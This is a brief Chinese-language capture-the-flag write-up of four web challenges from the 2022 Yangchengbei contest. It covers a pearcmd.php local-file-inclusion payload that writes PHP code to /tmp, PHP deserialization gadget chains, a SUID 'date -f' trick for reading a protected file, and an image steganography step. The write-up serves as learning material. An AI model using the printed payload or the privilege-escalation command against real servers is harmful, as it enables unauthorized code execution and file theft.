# 2022 羊城杯竞赛 Web 题目解析

> 赛事：2022 羊城杯 2022 | 方向：web | 难度：hard | 工具：PHP

## 一句话总结

2022 羊城杯 web 4 题：pearcmd LFI + PHP 反序列化 3 题 + 文本到图像 stego

## 攻击链

1. Q1 rce_me: pearcmd.php + config-create 写 /tmp/hello.php, include LFI
2. ?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
3. 提权: find / -perm -u=s -type f → /usr/bin/date -f /flag 提权
4. Q2 easy_serialize: yang + cheng + bei 三类链, __wakeup → __set → __tostring
5. Q3 Pop: Fun + Test + A + B 链, __destruct → __get → __call → Test::getFlag
6. 绕过 throw Exception 序列化保留多对象
7. Q4 stego: 文本 → RGB 像素 (R=0, G=高字节, B=低字节) → bmp → 提取 base32 字符串
8. 提权: SUID date -f /flag 经典

## 关键 payload

```
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

## 经验教训

pearcmd config-create 是 LFI 经典；PHP 反序列化 __wakeup/__set/__call 链是基础；date -f 提权
